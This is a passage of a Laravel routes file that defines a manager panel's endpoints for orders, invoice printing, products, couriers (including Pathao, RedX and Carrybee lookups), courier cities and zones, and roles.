    Route::post('/manager-orders/bulk-assign', [OrderController::class, 'bulkAssign'])->name('manager.orders.bulk.assign');
    // orders by status
    /*Route::get('/manager-orders/status/processing', 'OrderController@orderStatusProcessing')->name('manager.orders.status.processing');
    Route::get('/manager-orders/status/pending_payment', 'OrderController@orderStatusPendingPayment')->name('manager.orders.status.pending_payment');
    Route::get('/manager-orders/status/hold', 'OrderController@orderStatusHold')->name('manager.orders.status.hold');
    Route::get('/manager-orders/status/canceled', 'OrderController@orderStatusCanceled')->name('manager.orders.status.canceled');
    Route::get('/manager-orders/status/completed', 'OrderController@orderStatusCompleted')->name('manager.orders.status.completed');
    Route::get('/manager-orders/status/pending_delivery', 'OrderController@orderStatusPendingDelivery')->name('manager.orders.status.pending_delivery');
    Route::get('/manager-orders/status/on_delivery', 'OrderController@orderStatusOnDelivery')->name('manager.orders.status.on_delivery');
    Route::get('/manager-orders/status/return', 'OrderController@orderStatusReturn')->name('manager.orders.status.return');*/
    // order ajax calls
    Route::post('/manager-ajax-get-products', [OrderController::class, 'ajaxGetProducts'])->name('manager.ajax.get.products');
    Route::post('/manager-orders/print', [OrderController::class, 'printInvoice'])->name('manager.orders.print');
    Route::post('/manager-orders/bulk-print', [OrderController::class, 'printBulkInvoice'])->name('manager.orders.bulk.print');
    Route::post('/manager-orders/bulk-label-print', [OrderController::class, 'printBulkLabelInvoice'])->name('manager.orders.bulk.label.print');
    // shipping
    Route::post('/manager-ajax-shipping', [OrderController::class, 'getShipping'])->name('manager.ajax.get.shipping');

    // orders export
    Route::post('/manager-orders/courier_csv', [OrderController::class, 'courierCsv'])->name('manager.orders.courier_csv');
    // note update
    Route::post('/manager-orders/note-update', [OrderController::class, 'noteUpdate'])->name('manager.orders.note_update');
    // transaction
    Route::post('/manager-orders/transaction_view', [OrderController::class, 'transactionView'])->name('manager.orders.transaction_view');

    // product
    Route::get('/manager-product', [ProductController::class, 'index'])->name('manager.product');
    Route::get('/manager-product/create', [ProductController::class, 'create'])->name('manager.product.create');
    Route::post('/manager-product/store', [ProductController::class, 'store'])->name('manager.product.store');
    Route::get('/manager-product/{id}/edit', [ProductController::class, 'edit'])->name('manager.product.edit');
    Route::post('/manager-product/{id}/update', [ProductController::class, 'update'])->name('manager.product.update');
    Route::get('/manager-product/{id}/delete', [ProductController::class, 'delete'])->name('manager.product.delete');

    // courier
    Route::get('/manager-courier', [CourierController::class, 'index'])->name('manager.courier');
    Route::post('/manager-courier/store', [CourierController::class, 'store'])->name('manager.courier.store');
    Route::post('/manager-courier/update', [CourierController::class, 'update'])->name('manager.courier.update');
    Route::get('/manager-courier/delete/{id}', [CourierController::class, 'delete'])->name('manager.courier.delete');
    Route::post('/manager-courier-ajax_get_c_charge', [CourierController::class, 'ajaxGetCCharge'])->name('manager.courier.ajax.get.c_charge');

    // courier city
    Route::get('/manager-courier-city', [CourierController::class, 'cityIndex'])->name('manager.courier.city');
    Route::post('/manager-courier-city/store', [CourierController::class, 'cityStore'])->name('manager.courier.city.store');
    Route::post('/manager-courier-city/update', [CourierController::class, 'cityUpdate'])->name('manager.courier.city.update');
    Route::get('/manager-courier-city/delete/{id}', [CourierController::class, 'cityDelete'])->name('manager.courier.city.delete');
    Route::post('/manager-courier-ajax_get_cities', [CourierController::class, 'ajaxGetCities'])->name('manager.courier.ajax.get.cities');

    Route::post('/manager-courier-pathao_ajax_get_cities', [CourierController::class, 'pathaoAjaxGetCities'])->name('manager.courier.pataho.ajax.get.cities');
    Route::post('/manager-courier-pathao_ajax_get_zones', [CourierController::class, 'pathaoAjaxGetZones'])->name('manager.courier.pataho.ajax.get.zones');

    Route::post('/manager-courier-redx_ajax_get_cities', [CourierController::class, 'redxAjaxGetCities'])->name('manager.courier.redx.ajax.get.cities');
    Route::post('/manager-courier-carrybee_ajax_get_cities', [CourierController::class, 'carrybeeAjaxGetCities'])->name('manager.courier.carrybee.ajax.get.cities');
    Route::post('/manager-courier-carrybee_ajax_get_zones', [CourierController::class, 'carrybeeAjaxGetZones'])->name('manager.courier.carrybee.ajax.get.zones');

    // courier zone
    Route::get('/manager-courier-zone', [CourierController::class, 'zoneIndex'])->name('manager.courier.zone');
    Route::post('/manager-courier-zone/store', [CourierController::class, 'zoneStore'])->name('manager.courier.zone.store');
    Route::post('/manager-courier-zone/update', [CourierController::class, 'zoneUpdate'])->name('manager.courier.zone.update');
    Route::get('/manager-courier-zone/delete/{id}', [CourierController::class, 'zoneDelete'])->name('manager.courier.zone.delete');
    Route::post('/manager-courier-ajax_get_zones', [CourierController::class, 'ajaxGetZones'])->name('manager.courier.ajax.get.zones');

    // roles
    Route::get('/manager-roles', [RoleController::class, 'index'])->name('manager.roles');
    Route::post('/manager-roles/store', [RoleController::class, 'store'])->name('manager.roles.store');
    Route::post('/manager-roles/update', [RoleController::class, 'update'])->name('manager.roles.update');
    Route::get('/manager-roles/{id}/{role}/delete', [RoleController::class, 'delete'])->name('manager.roles.delete');
});
